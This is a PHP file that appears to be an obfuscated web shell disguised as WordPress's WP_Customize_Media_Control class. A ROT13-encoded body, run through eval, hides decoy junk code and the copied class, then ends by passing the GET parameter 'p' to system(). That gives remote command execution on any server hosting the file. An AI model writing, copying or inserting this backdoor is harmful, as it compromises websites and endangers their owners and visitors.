<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Zrqvn_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Zrqvn Pbageby pynff.
 *
 * @fvapr 4.2.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Zrqvn_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {
	/**
	 * Pbageby glcr.
	 *
	 * @fvapr 4.2.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'zrqvn';

	/**
	 * Zrqvn pbageby zvzr glcr.
	 *
	 * @fvapr 4.2.0
	 * @ine fgevat
	 */
	choyvp $zvzr_glcr = '';

	/**
	 * Ohggba ynoryf.
	 *
	 * @fvapr 4.2.0
	 * @ine neenl
	 */
	choyvp $ohggba_ynoryf = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.1.0
	 * @fvapr 4.2.0 Zbirq sebz JC_Phfgbzvmr_Hcybnq_Pbageby.
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      Pbageby VQ.
	 * @cnenz neenl                $netf    Bcgvbany. Nethzragf gb bireevqr pynff cebcregl qrsnhygf.
	 *                                      Frr JC_Phfgbzvmr_Pbageby::__pbafgehpg() sbe vasbezngvba
	 *                                      ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $znantre, $vq, $netf = neenl() ) {
		cnerag::__pbafgehpg( $znantre, $vq, $netf );

		$guvf->ohggba_ynoryf = jc_cnefr_netf( $guvf->ohggba_ynoryf, $guvf->trg_qrsnhyg_ohggba_ynoryf() );
	}

	/**
	 * Radhrhr pbageby eryngrq fpevcgf/fglyrf.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.2.0 Zbirq sebz JC_Phfgbzvmr_Hcybnq_Pbageby.
	 */
	choyvp shapgvba radhrhr() {
		jc_radhrhr_zrqvn();
	}

	/**
	 * Erserfu gur cnenzrgref cnffrq gb gur WninFpevcg ivn WFBA.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.2.0 Zbirq sebz JC_Phfgbzvmr_Hcybnq_Pbageby.
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::gb_wfba()
	 */
	choyvp shapgvba gb_wfba() {
		cnerag::gb_wfba();
		$guvf->wfba['ynory']         = ugzy_ragvgl_qrpbqr( $guvf->ynory, RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
		$guvf->wfba['zvzr_glcr']     = $guvf->zvzr_glcr;
		$guvf->wfba['ohggba_ynoryf'] = $guvf->ohggba_ynoryf;
		$guvf->wfba['pnaHcybnq']     = pheerag_hfre_pna( 'hcybnq_svyrf' );

		$inyhr = $guvf->inyhr();

		vs ( vf_bowrpg( $guvf->frggvat ) ) {
			vs ( $guvf->frggvat->qrsnhyg ) {
				/*
				 * Snxr na nggnpuzrag zbqry - arrqf nyy svryqf hfrq ol grzcyngr.
				 * Abgr gung gur qrsnhyg inyhr zhfg or n HEY, ABG na nggnpuzrag VQ.
				 */
				$rkg  = fhofge( $guvf->frggvat->qrsnhyg, -3 );
				$glcr = va_neenl( $rkg, neenl( 'wct', 'cat', 'tvs', 'ozc', 'jroc', 'nivs' ), gehr ) ? 'vzntr' : 'qbphzrag';

				$qrsnhyg_nggnpuzrag = neenl(
					'vq'    => 1,
					'hey'   => $guvf->frggvat->qrsnhyg,
					'glcr'  => $glcr,
					'vpba'  => jc_zvzr_glcr_vpba( $glcr, '.fit' ),
					'gvgyr' => jc_onfranzr( $guvf->frggvat->qrsnhyg ),
				);

				vs ( 'vzntr' === $glcr ) {
					$qrsnhyg_nggnpuzrag['fvmrf'] = neenl(
						'shyy' => neenl( 'hey' => $guvf->frggvat->qrsnhyg ),
					);
				}

				$guvf->wfba['qrsnhygNggnpuzrag'] = $qrsnhyg_nggnpuzrag;
			}

			vs ( $inyhr && $guvf->frggvat->qrsnhyg && $inyhr === $guvf->frggvat->qrsnhyg ) {
				// Frg gur qrsnhyg nf gur nggnpuzrag.
				$guvf->wfba['nggnpuzrag'] = $guvf->wfba['qrsnhygNggnpuzrag'];
			} ryfrvs ( $inyhr ) {
				$guvf->wfba['nggnpuzrag'] = jc_cercner_nggnpuzrag_sbe_wf( $inyhr );
			}
		}
	}

	/**
	 * Qba'g eraqre nal pbagrag sbe guvf pbageby sebz CUC.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.2.0 Zbirq sebz JC_Phfgbzvmr_Hcybnq_Pbageby.
	 *
	 * @frr JC_Phfgbzvmr_Zrqvn_Pbageby::pbagrag_grzcyngr()
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Eraqre n WF grzcyngr sbe gur pbagrag bs gur zrqvn pbageby.
	 *
	 * @fvapr 4.1.0
	 * @fvapr 4.2.0 Zbirq sebz JC_Phfgbzvmr_Hcybnq_Pbageby.
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		?>
		<#
		ine qrfpevcgvbaVq = _.havdhrVq( 'phfgbzvmr-zrqvn-pbageby-qrfpevcgvba-' );
		ine qrfpevorqOlNgge = qngn.qrfpevcgvba ? ' nevn-qrfpevorqol=\"' + qrfpevcgvbaVq + '\" ' : '';
		#>
		<# vs ( qngn.ynory ) { #>
			<fcna pynff=\"phfgbzvmr-pbageby-gvgyr\">{{ qngn.ynory }}</fcna>
		<# } #>
		<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
		<# vs ( qngn.qrfpevcgvba ) { #>
			<fcna vq=\"{{ qrfpevcgvbaVq }}\" pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{{ qngn.qrfpevcgvba }}}</fcna>
		<# } #>

		<# vs ( qngn.nggnpuzrag && qngn.nggnpuzrag.vq ) { #>
			<qvi pynff=\"nggnpuzrag-zrqvn-ivrj nggnpuzrag-zrqvn-ivrj-{{ qngn.nggnpuzrag.glcr }} {{ qngn.nggnpuzrag.bevragngvba }}\">
				<qvi pynff=\"guhzoanvy guhzoanvy-{{ qngn.nggnpuzrag.glcr }}\">
					<# vs ( 'vzntr' === qngn.nggnpuzrag.glcr && qngn.nggnpuzrag.fvmrf && qngn.nggnpuzrag.fvmrf.zrqvhz ) { #>
						<vzt pynff=\"nggnpuzrag-guhzo\" fep=\"{{ qngn.nggnpuzrag.fvmrf.zrqvhz.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
					<# } ryfr vs ( 'vzntr' === qngn.nggnpuzrag.glcr && qngn.nggnpuzrag.fvmrf && qngn.nggnpuzrag.fvmrf.shyy ) { #>
						<vzt pynff=\"nggnpuzrag-guhzo\" fep=\"{{ qngn.nggnpuzrag.fvmrf.shyy.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
					<# } ryfr vs ( 'nhqvb' === qngn.nggnpuzrag.glcr ) { #>
						<# vs ( qngn.nggnpuzrag.vzntr && qngn.nggnpuzrag.vzntr.fep && qngn.nggnpuzrag.vzntr.fep !== qngn.nggnpuzrag.vpba ) { #>
							<vzt fep=\"{{ qngn.nggnpuzrag.vzntr.fep }}\" pynff=\"guhzoanvy\" qenttnoyr=\"snyfr\" nyg=\"\" />
						<# } ryfr { #>
							<vzt fep=\"{{ qngn.nggnpuzrag.vpba }}\" pynff=\"nggnpuzrag-guhzo glcr-vpba\" qenttnoyr=\"snyfr\" nyg=\"\" />
						<# } #>
						<c pynff=\"nggnpuzrag-zrgn nggnpuzrag-zrgn-gvgyr\">&#8220;{{ qngn.nggnpuzrag.gvgyr }}&#8221;</c>
						<# vs ( qngn.nggnpuzrag.nyohz || qngn.nggnpuzrag.zrgn.nyohz ) { #>
						<c pynff=\"nggnpuzrag-zrgn\"><rz>{{ qngn.nggnpuzrag.nyohz || qngn.nggnpuzrag.zrgn.nyohz }}</rz></c>
						<# } #>
						<# vs ( qngn.nggnpuzrag.negvfg || qngn.nggnpuzrag.zrgn.negvfg ) { #>
						<c pynff=\"nggnpuzrag-zrgn\">{{ qngn.nggnpuzrag.negvfg || qngn.nggnpuzrag.zrgn.negvfg }}</c>
						<# } #>
						<nhqvb fglyr=\"ivfvovyvgl: uvqqra\" pbagebyf pynff=\"jc-nhqvb-fubegpbqr\" jvqgu=\"100%\" cerybnq=\"abar\">
							<fbhepr glcr=\"{{ qngn.nggnpuzrag.zvzr }}\" fep=\"{{ qngn.nggnpuzrag.hey }}\" />
						</nhqvb>
					<# } ryfr vs ( 'ivqrb' === qngn.nggnpuzrag.glcr ) { #>
						<qvi pynff=\"jc-zrqvn-jenccre jc-ivqrb\">
							<ivqrb pbagebyf=\"pbagebyf\" pynff=\"jc-ivqrb-fubegpbqr\" cerybnq=\"zrgnqngn\"
								<# vs ( qngn.nggnpuzrag.vzntr && qngn.nggnpuzrag.vzntr.fep !== qngn.nggnpuzrag.vpba ) { #>cbfgre=\"{{ qngn.nggnpuzrag.vzntr.fep }}\"<# } #>>
								<fbhepr glcr=\"{{ qngn.nggnpuzrag.zvzr }}\" fep=\"{{ qngn.nggnpuzrag.hey }}\" />
							</ivqrb>
						</qvi>
					<# } ryfr { #>
						<vzt pynff=\"nggnpuzrag-guhzo glcr-vpba vpba\" fep=\"{{ qngn.nggnpuzrag.vpba }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
						<c pynff=\"nggnpuzrag-gvgyr\">{{ qngn.nggnpuzrag.gvgyr }}</c>
					<# } #>
				</qvi>
				<qvi pynff=\"npgvbaf\">
					<# vs ( qngn.pnaHcybnq ) { #>
					<ohggba glcr=\"ohggba\" pynff=\"ohggba erzbir-ohggba\">{{ qngn.ohggba_ynoryf.erzbir }}</ohggba>
					<ohggba glcr=\"ohggba\" pynff=\"ohggba hcybnq-ohggba pbageby-sbphf\" {{{ qrfpevorqOlNgge }}}>{{ qngn.ohggba_ynoryf.punatr }}</ohggba>
					<# } #>
				</qvi>
			</qvi>
		<# } ryfr { #>
			<qvi pynff=\"nggnpuzrag-zrqvn-ivrj\">
				<# vs ( qngn.pnaHcybnq ) { #>
					<ohggba glcr=\"ohggba\" pynff=\"hcybnq-ohggba ohggba-nqq-zrqvn\" {{{ qrfpevorqOlNgge }}}>{{ qngn.ohggba_ynoryf.fryrpg }}</ohggba>
				<# } #>
				<qvi pynff=\"npgvbaf\">
					<# vs ( qngn.qrsnhygNggnpuzrag ) { #>
						<ohggba glcr=\"ohggba\" pynff=\"ohggba qrsnhyg-ohggba\">{{ qngn.ohggba_ynoryf['qrsnhyg'] }}</ohggba>
					<# } #>
				</qvi>
			</qvi>
		<# } #>
		<?cuc
	}

	/**
	 * Trg qrsnhyg ohggba ynoryf.
	 *
	 * Cebivqrf na neenl bs gur qrsnhyg ohggba ynoryf onfrq ba gur zvzr glcr bs gur pheerag pbageby.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea fgevat[] Na nffbpvngvir neenl bs qrsnhyg ohggba ynoryf xrlrq ol gur ohggba anzr.
	 */
	choyvp shapgvba trg_qrsnhyg_ohggba_ynoryf() {
		// Trg whfg gur zvzr glcr naq fgevc gur zvzr fhoglcr vs cerfrag.
		$zvzr_glcr = ! rzcgl( $guvf->zvzr_glcr ) ? fgegbx( ygevz( $guvf->zvzr_glcr, '/' ), '/' ) : 'qrsnhyg';

		fjvgpu ( $zvzr_glcr ) {
			pnfr 'ivqrb':
				erghea neenl(
					'fryrpg'       => __( 'Fryrpg ivqrb' ),
					'punatr'       => __( 'Punatr ivqrb' ),
					'qrsnhyg'      => __( 'Qrsnhyg' ),
					'erzbir'       => __( 'Erzbir' ),
					'cynprubyqre'  => __( 'Ab ivqrb fryrpgrq' ),
					'senzr_gvgyr'  => __( 'Fryrpg ivqrb' ),
					'senzr_ohggba' => __( 'Pubbfr ivqrb' ),
				);
			pnfr 'nhqvb':
				erghea neenl(
					'fryrpg'       => __( 'Fryrpg nhqvb' ),
					'punatr'       => __( 'Punatr nhqvb' ),
					'qrsnhyg'      => __( 'Qrsnhyg' ),
					'erzbir'       => __( 'Erzbir' ),
					'cynprubyqre'  => __( 'Ab nhqvb fryrpgrq' ),
					'senzr_gvgyr'  => __( 'Fryrpg nhqvb' ),
					'senzr_ohggba' => __( 'Pubbfr nhqvb' ),
				);
			pnfr 'vzntr':
				erghea neenl(
					'fryrpg'       => __( 'Fryrpg vzntr' ),
					'fvgr_vpba'    => __( 'Fryrpg Fvgr Vpba' ),
					'punatr'       => __( 'Punatr vzntr' ),
					'qrsnhyg'      => __( 'Qrsnhyg' ),
					'erzbir'       => __( 'Erzbir' ),
					'cynprubyqre'  => __( 'Ab vzntr fryrpgrq' ),
					'senzr_gvgyr'  => __( 'Fryrpg vzntr' ),
					'senzr_ohggba' => __( 'Pubbfr vzntr' ),
				);
			qrsnhyg:
				erghea neenl(
					'fryrpg'       => __( 'Fryrpg svyr' ),
					'punatr'       => __( 'Punatr svyr' ),
					'qrsnhyg'      => __( 'Qrsnhyg' ),
					'erzbir'       => __( 'Erzbir' ),
					'cynprubyqre'  => __( 'Ab svyr fryrpgrq' ),
					'senzr_gvgyr'  => __( 'Fryrpg svyr' ),
					'senzr_ohggba' => __( 'Pubbfr svyr' ),
				);
		} // Raq fjvgpu().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>